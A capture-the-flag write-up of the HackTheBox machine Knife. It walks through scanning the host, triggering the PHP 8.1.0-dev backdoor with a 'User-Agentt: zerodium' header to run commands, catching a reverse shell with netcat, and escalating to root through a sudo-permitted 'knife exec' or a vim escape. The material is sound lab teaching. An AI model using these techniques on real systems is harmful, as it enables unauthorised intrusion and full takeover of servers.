---
title: HTB: Knife
url: https://0xdf.gitlab.io/2021/08/28/htb-knife.html
date: 2021-08-28T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-knife, nmap, php-backdoor, feroxbuster, php-8.1.0-dev, sudo, knife, gtfobins, vim, oscp-like-v2
---

![Knife](https://0xdfimages.gitlab.io/img/knife-cover.png)

Knife is one of the easier boxes on HTB, but it’s also one that has gotten significantly easier since it’s release. I’ll start with a webserver that isn’t hosting much of a site, but is leaking that it’s running a dev version of PHP. This version happens to be the version that had a backdoor inserted into it when the PHP development servers were hacked in March 2021. At the time of release, just searching for this version string didn’t immediately lead to the backdoor, but within two days of release it did. For root, the user can run knife as root. At the time of release, there was no GTFObins page for knife, so the challenge required reading the docs to find a way to run arbitrary code. That page now exists.

## Box Info

| Name | [Knife](https://hackthebox.com/machines/knife)  [Knife](https://hackthebox.com/machines/knife) [Play on HackTheBox](https://hackthebox.com/machines/knife) |
| --- | --- |
| Release Date | [22 May 2021](https://twitter.com/hackthebox_eu/status/1395032006380199936) |
| Retire Date | 28 Aug 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Knife |
| Radar Graph | Radar chart for Knife |
| First Blood User | 00:13:43[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 00:19:31[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [MrKN16H7 MrKN16H7](https://app.hackthebox.com/users/98767) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.242
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 15:11 EDT
Nmap scan report for 10.10.10.242
Host is up (0.022s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.25 seconds

oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.242
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 15:11 EDT
Nmap scan report for 10.10.10.242
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal.

### Website - TCP 80

#### Site

The site is for a medical group:

![image-20210522152825884](https://0xdfimages.gitlab.io/img/image-20210522152825884.png)

That’s the entire page. There is nothing on the page to interact with.

#### Tech Stack

I can take a couple guesses at what page `/` is, and it seems that `index.php` loads the same page, so it’s safe to assume the site is PHP based. The response headers confirm this:

```

HTTP/1.1 200 OK
Date: Sat, 22 May 2021 19:30:15 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Connection: close
Content-Type: text/html; charset=UTF-8

```

The PHP version is important to note here. It is not uncommon for PHP to report it’s version like this.

#### Directory Brute Force

I’ll run `feroxbuuster` against the site:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.242 -o scans/ferozbuster-root-php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.242
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ scans/ferozbuster-root-php
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403        9l       28w      277c http://10.10.10.242/server-status
[####################] - 15s    29999/29999   0s      found:1       errors:0      
[####################] - 15s    29999/29999   1974/s  http://10.10.10.242

```

There is a `/server-status` page, but nothing interesting.

## Shell as james

### Find Exploit

The `X-Powered-By` header gives a very specific PHP version, PHP/8.1.0-dev. Some knowledge of the news reminds me that there was an issue with the PHP source repository where it got hacked and a backdoor was inserted ([ref1](https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/), [ref2](https://www.welivesecurity.com/2021/03/30/backdoor-php-source-code-git-server-breach/), lots more).

Kind of surprisingly, on release day, Googling this version didn’t turn up the news stories about this backdoor, so it took a bit more research to figure out that this version was the one associated with the backdoor. That said, two days after Knife’s release, the top link on Google mentioned the backdoor:

![image-20210524091617210](https://0xdfimages.gitlab.io/img/image-20210524091617210.png)

Today, three months after release, it fills the first page, including links from exploit-db and packetstrom with exploit scripts.

### Backdoor Details

Because of how GitHub and open-source works, I can look right at the [commit that adds this backdoor](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d) into the PHP codebase. The commit changes one file, `ext/zlib/zlib.c`, adding 11 lines of code (all in green):

[![image-20210827112703573](https://0xdfimages.gitlab.io/img/image-20210827112703573.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210827112703573.png)

It’s fascinating to see others commenting on the commit, the first comment asking if the misspelling of `HTTP_USER_AGENT` as `HTTP_USER_AGENTT` was a mistake, and four lines later someone asking what it did, and someone else responding basically that’s it’s a backdoor, and how it works.

As the devs point out, to execute this backdoor, I’ll need a `User-Agentt` header that starts with “zerodium”, and whatever is after that will be executed as PHP code.

### RCE

To test this, I’ll send the GET request over to Burp Repeater and replace the `User-Agent` header with the malicious one:

[![image-20210522154141823](https://0xdfimages.gitlab.io/img/image-20210522154141823.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210522154141823.png)

It runs `system("id")` and the result is at the top of the response.

### Shell

I’ll replace `id` with a reverse shell, and run it again.

![image-20210522154302972](https://0xdfimages.gitlab.io/img/image-20210522154302972.png)

The response just hangs, but at `nc`, I’ve got a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.242] 55806
bash: cannot set terminal process group (933): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ 

```

I’ll upgrade with the normal trick:

```

james@knife:/$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
james@knife:/$ ^Z
[1]+  Stopped                 nc -lnvp 443 
oxdf@parrot$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
james@knife:/$ 

```

And grab the user flag:

```

james@knife:~$ cat user.txt
77834514************************

```

## Shell as root

### Enumeration

When trying to escalate on Linux, always check `sudo -l`:

```

james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```

james can run `knife` as root.

### Background

[Chef](https://docs.chef.io/platform_overview/) is an automation/infrastructure platform:

> Chef Infra is a powerful automation platform that transforms infrastructure into code. Whether you’re operating in the cloud, on-premises, or in a hybrid environment, Chef Infra automates how infrastructure is configured, deployed, and managed across your network, no matter its size.

`knife` is a command line tool manage Chef. According to the [docs](https://docs.chef.io/workstation/knife/), it manages aspects of Chef such as:

> - Nodes
> - Cookbooks and recipes
> - Roles, Environments, and Data Bags
> - Resources within various cloud environments
> - The installation of Chef Infra Client onto nodes
> - Searching of indexed data on the Chef Infra Server

### Shell

While GTFObins has a [page for knife](https://gtfobins.github.io/gtfobins/knife/), it didn’t when Knife released, leaving me to comb the docs. There are several ways to get execution through `knife`. I’ll show two.

#### vim Escape

Running `knife data bag create 0xdf output -e vim` will open a new bag in `vim`:

![image-20210522155041425](https://0xdfimages.gitlab.io/img/image-20210522155041425.png)

I’ll escape vim with `:!/bin/bash`:

![image-20210522155109446](https://0xdfimages.gitlab.io/img/image-20210522155109446.png)

#### exec

More simply, `knife` has an `exec` [command](https://docs.chef.io/workstation/knife_exec/) that will run Ruby code. This is the technique now on GTFObins, but it wasn’t there when Knife released. There was a [GTFObins page on Ruby](https://gtfobins.github.io/gtfobins/ruby/#sudo) that shows running `sudo ruby -e 'exec "/bin/sh"'`. The Ruby code there is `exec "/bin/sh"`. Using the same Ruby code here works:

```

james@knife:~$ sudo knife exec -E "exec '/bin/bash'"         
root@knife:/home/james#

```

This one is actually cool because I can run it through the PHP vuln and get both flags in one command:

![image-20210523065600707](https://0xdfimages.gitlab.io/img/image-20210523065600707.png)